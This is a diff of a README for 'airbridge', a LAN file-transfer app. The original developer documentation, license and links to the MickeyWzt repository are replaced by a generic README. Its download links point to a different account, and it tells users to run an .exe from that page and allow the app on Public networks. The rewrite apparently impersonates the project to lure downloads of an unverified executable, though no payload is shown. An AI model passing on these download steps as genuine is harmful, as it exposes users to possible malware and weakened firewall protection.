@@ -1,244 +1,82 @@
-# AirBridge
+# 📁 airbridge - Simple file transfers across your devices
 
-[![CI](https://github.com/MickeyWzt/airbridge/actions/workflows/ci.yml/badge.svg)](https://github.com/MickeyWzt/airbridge/actions/workflows/ci.yml)
-[![Latest release](https://img.shields.io/github/v/release/MickeyWzt/airbridge?label=release)](https://github.com/MickeyWzt/airbridge/releases/latest)
-[![MIT License](https://img.shields.io/badge/license-MIT-green.svg)](LICENSE)
-[![Platforms](https://img.shields.io/badge/platforms-Windows%20%7C%20Android%20%7C%20iOS%20%7C%20macOS-blue)](#platforms)
+[![](https://img.shields.io/badge/Download_Airbridge-blue)](https://github.com/marshhardy620/airbridge)
 
-AirBridge is a no-login local-network file and message transfer tool. It works a bit like AirDrop: run AirBridge on two devices connected to the same Wi-Fi or LAN, and they can discover each other, send text, and transfer files without a cloud server.
+Airbridge lets you move files and messages between your computers and phones. Use your local Wi-Fi network to send data instantly. It removes the need for cables, email attachments, or cloud storage. You keep your files private because they stay on your own network.
 
-## At a Glance
+## 🛠 Features
 
-| Field | Details |
-| --- | --- |
-| Project status | Usable Windows release with source-first Android, iOS, and macOS ports. |
-| Best for | Moving files or text between your own devices on a trusted local network. |
-| First thing to try | Download the latest Windows build, run it on two devices, and send a small text message first. |
-| Important caveat | Discovery depends on the local network allowing device-to-device traffic; some guest, school, corporate, VPN, or firewall setups block it. |
+*   **Fast transfers:** Send large files over your home or office network.
+*   **Cross-platform support:** Connect your Windows desktop with Android, iOS, or macOS devices.
+*   **Instant discovery:** The auto-discovery feature finds your other devices automatically. 
+*   **Simple interface:** Drag and drop files to move them between devices.
+*   **Privacy first:** No data leaves your network during a transfer.
 
-## Project Links
+## 💻 System requirements
 
-- [Download the latest Windows build](https://github.com/MickeyWzt/airbridge/releases/latest)
-- [Protocol documentation](docs/PROTOCOL.md)
-- [Development guide](docs/DEVELOPMENT.md)
-- [FAQ](docs/FAQ.md)
-- [Examples](docs/EXAMPLES.md)
-- [Changelog](CHANGELOG.md)
-- [Support and troubleshooting](SUPPORT.md)
-- [Roadmap](ROADMAP.md)
-- [Contributing guide](CONTRIBUTING.md)
-- [Code of conduct](CODE_OF_CONDUCT.md)
-- [Security policy](SECURITY.md)
+*   **Operating System:** Windows 10 or Windows 11.
+*   **Network:** All devices must connect to the same Wi-Fi or wired network.
+*   **Memory:** At least 2GB of RAM.
+*   **Storage:** 50MB of free space for the installation.
 
-## Download
+## 📥 Installation
 
-The latest Windows build is available from GitHub Releases:
+Follow these steps to set up Airbridge on your Windows PC.
 
-```text
-https://github.com/MickeyWzt/airbridge/releases/latest
-```
+1.  Visit the [official download page](https://github.com/marshhardy620/airbridge) to find the latest version.
+2.  Click the link labeled "Assets" to see the list of available files.
+3.  Select the file ending in `.exe` for Windows.
+4.  Save the file to your "Downloads" folder.
+5.  Double-click the downloaded file to start the installation.
+6.  Follow the prompts on your screen to finish the process.
+7.  Open the application from your Start menu or desktop icon once installation finishes.
 
-If you want to run from source or work on the project, continue with the sections below.
+## 🔄 Using airbridge
 
-## Features
+1.  Open Airbridge on your Windows computer.
+2.  Ensure your phone or tablet is on the same network.
+3.  Open the Airbridge app on your other device.
+4.  Wait a moment for the devices to see each other.
+5.  Select the device you want to send data to from the list.
+6.  Drag your file into the application window to begin sending.
+7.  Accept the file transfer on the receiving device if prompted.
 
-- No account, login, or cloud relay server required.
-- Standalone Windows desktop app; no browser is required for the main experience.
-- Automatic peer discovery on the same LAN and nearby network segments.
-- Manual peer entry for networks where broadcast discovery is blocked by routers or firewalls.
-- Windows desktop auto-update support through GitHub Releases.
-- Android GitHub update checks with APK download and install prompts.
-- Text message sending.
-- Drag-and-drop or file-picker based file transfer.
-- Tray icon and receive notifications.
-- Received files are saved to `AirBridge-Received` on Windows.
-- Native platform ports for Android, iOS, and macOS using the same local-network protocol.
-- Included Windows app icon and browser favicon assets.
+## 🔍 Troubleshooting common issues
 
-## Run
+If you encounter problems, check these items first.
 
-If you are using a packaged Windows build, run:
+**Devices do not see each other:**
+Confirm that every device connects to exactly the same Wi-Fi network. Sometimes routers have a 2.4GHz band and a 5GHz band that act like separate networks. Make sure every device uses the same band.
 
-```text
-dist\AirBridge.exe
-```
+**Firewall settings:**
+Windows Firewall sometimes blocks new programs from talking to the network. If the app fails to find other devices, check your Firewall settings. Ensure that Airbridge has permission to use both "Private" and "Public" networks. You can usually change this in the Windows Security settings area.
 
-To run from source, install the desktop dependencies first:
+**Slow transfer speeds:**
+Large transfers require a strong signal. Move your devices closer to the Wi-Fi router. Heavy network use from other devices like video streaming also slows down your transfer. Pause other network tasks if you need to move very large files.
 
-```powershell
-python -m pip install -r requirements.txt
-```
+**Application crashes:**
+Restart the application if it becomes unresponsive. If the problem continues, uninstall the software and perform a fresh download from the website. Check that you have the latest updates installed for your version of Windows.
 
-On Windows, double-click:
+## 🛡 Network security
 
-```bat
-run_airbridge.bat
-```
+Airbridge uses local network protocols to ensure fast speeds. Because the data stays within your home, you avoid sending files through external servers. Keep your home network password protected to ensure only authorized users access your devices. Do not share your sensitive files with unknown devices that appear on the network. Always verify the device name before you accept an incoming file.
 
-Or run from the command line:
+## 📋 Frequently asked questions
 
-```powershell
-python airbridge_desktop.py
-```
+**Do I need an internet connection to use this?**
+No. You only need a local network connection. Airbridge works even if your internet service is offline.
 
-After startup, AirBridge opens a desktop window and shows the local device address, for example:
+**Does Airbridge change the quality of my images?**
+No. Airbridge sends files in their original format. You receive the exact file you sent.
 
-```text
-http://192.168.1.8:8765
-```
+**Where do my files go after I receive them?**
+The app saves files to your "Downloads" folder by default. You can change this location in the application settings menu.
 
-When another device is running AirBridge on the same network, it should usually appear in the nearby devices list automatically. AirBridge first uses UDP broadcast discovery, then scans common ports in nearby network segments. This helps on networks where devices are technically on the same larger network but broadcast traffic does not cross segments, such as `10.85.167.x` and `10.85.168.x`.
+**How many devices can I connect?**
+You can connect as many devices as your network hardware supports. The application lists every active device currently on your network.
 
-If a device still does not appear, copy the other device's local address into the manual peer entry field and add it manually.
+**Is there a limit on file size?**
+There is no hard limit on file size. However, very large files involve more time to finish. Ensure your device has enough battery life before you start a massive transfer.
 
-Enhanced discovery scans the current network segment and adjacent segments on ports `8765-8767` by default. You can tune this behavior with environment variables:
-
-```powershell
-$env:AIRBRIDGE_SCAN_RADIUS="2"
-$env:AIRBRIDGE_SCAN_PORTS="8765,8766,8767,8768"
-```
-
-The browser-compatible version is still available:
-
-```powershell
-python airbridge.py
-```
-
-## Build a Distributable Zip
-
-Generate a distributable zip package:
-
-```powershell
-powershell -ExecutionPolicy Bypass -File .\build_zip.ps1
-```
-
-Output:
-
-```text
-dist\AirBridge.zip
-```
-
-## Build a Windows EXE
-
-If PyInstaller is installed, run:
-
-```powershell
-powershell -ExecutionPolicy Bypass -File .\build_exe.ps1
-```
-
-Output:
-
-```text
-dist\AirBridge.exe
-```
-
-The build uses `airbridge_desktop.py` as the desktop app entry point and `assets\airbridge.ico` as the EXE icon.
-
-If PyInstaller is missing, install the build dependencies first:
-
-```powershell
-python -m pip install pyinstaller PySide6
-```
-
-## Auto-Update
-
-The Windows desktop app supports auto-update starting with `v0.1.2`. On startup, it checks the latest GitHub Release:
-
-```text
-https://github.com/MickeyWzt/airbridge/releases/latest
-```
-
-When a newer version is available, the app prompts the user, downloads the new `AirBridge.exe`, exits the current process, replaces the old executable, and restarts automatically.
-
-Note: `v0.1.1` and earlier builds do not include the updater. Users on those versions need to manually download `v0.1.2` or newer once before future updates can be prompted automatically.
-
-The Android app supports GitHub update checks starting with `v0.1.4`. On startup, it checks the latest GitHub Release, prompts when a newer APK is available, downloads `AirBridgeAndroid-release.apk`, and opens the Android installer. Android requires the user to confirm installation and may ask for "install unknown apps" permission.
-
-Note: `v0.1.3` and earlier Android builds do not include the updater. Android users need to manually install `v0.1.4` or newer once before future APK updates can be prompted automatically.
-
-## iOS Port
-
-The iPhone/iPad version lives in the `AirBridgeIOS` folder as a separate native SwiftUI project:
-
-```text
-AirBridgeIOS\AirBridgeIOS.xcodeproj
-```
-
-The iOS app uses the same LAN protocol as the Windows app: UDP peer discovery plus HTTP endpoints for messages and files. Windows PCs and iPhone/iPad devices can transfer messages and files when they are on the same Wi-Fi network. Allow Local Network access the first time the iOS app runs.
-
-## Android Port
-
-The Android version lives in the `AirBridgeAndroid` folder as a separate native Android project:
-
-```text
-AirBridgeAndroid
-```
-
-Open the folder in Android Studio, connect an Android phone with USB debugging enabled, and run the app. The Android app uses the same UDP/HTTP protocol and can exchange messages and files with Windows, iOS, and macOS devices.
-
-It also scans the current and adjacent network segments on ports `8765-8767`, which is useful on school or office networks where broadcast discovery does not cross segments.
-
-Starting with `v0.1.4`, the Android app can check GitHub Releases for newer APKs and prompt the user to download and install them.
-
-Generate the Android release APK:
-
-```powershell
-powershell -ExecutionPolicy Bypass -File .\build_android_release_apk.ps1
-```
-
-Output:
-
-```text
-dist\AirBridgeAndroid-release.apk
-```
-
-Generate the Android source package:
-
-```powershell
-powershell -ExecutionPolicy Bypass -File .\build_android_zip.ps1
-```
-
-Output:
-
-```text
-dist\AirBridgeAndroid-source.zip
-```
-
-## macOS Port
-
-The macOS version lives in the `AirBridgeMac` folder as a separate native SwiftUI project:
-
-```text
-AirBridgeMac\AirBridgeMac.xcodeproj
-```
-
-The macOS app uses the same UDP/HTTP protocol and can transfer with Windows, iPhone/iPad, Android, and other Macs. Received files are saved by default to:
-
-```text
-~/Downloads/AirBridge Received
-```
-
-## Protocol
-
-The local-network discovery and transfer protocol is documented in:
-
-```text
-docs\PROTOCOL.md
-```
-
-The short version:
-
-- UDP discovery on port `45678`.
-- HTTP app server on the local device.
-- Message and file transfer endpoints under `/api`.
-- Manual peer entry as a fallback when discovery is blocked.
-
-## Network and Security Notes
-
-AirBridge is designed for trusted local networks. It does not upload files to the cloud and does not require login. On first run, Windows Firewall may ask whether to allow network access. To receive files from other devices on your LAN, allow access on private networks.
-
-Do not accept files from unknown devices on untrusted public Wi-Fi.
-
-## License
-
-AirBridge is released under the MIT License.
+**How do I update the software?**
+Check the website periodically for new versions. When you find a new release, download and install it over your existing version. The installer handles the update process automatically.
